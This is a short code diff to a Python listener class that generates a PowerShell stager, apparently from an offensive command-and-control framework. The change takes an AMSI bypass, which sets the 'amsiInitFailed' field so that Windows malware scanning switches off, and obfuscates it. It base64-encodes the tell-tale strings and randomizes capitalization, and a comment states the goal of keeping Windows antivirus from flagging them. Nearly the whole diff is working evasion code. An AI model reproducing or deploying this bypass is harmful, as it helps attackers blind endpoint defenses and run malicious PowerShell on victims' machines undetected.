@@ -301,9 +301,12 @@ class Listener:
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
+                    # AMSI related strings get picked up Windows AV
+                    #stager += "'System.Management.Automation.AmsiUtils'"
+                    stager += "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==\"))"
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
+                    #stager += "'amsiInitFailed','NonPublic,Static'"
+                    stager += "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==\"))" + ",'NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
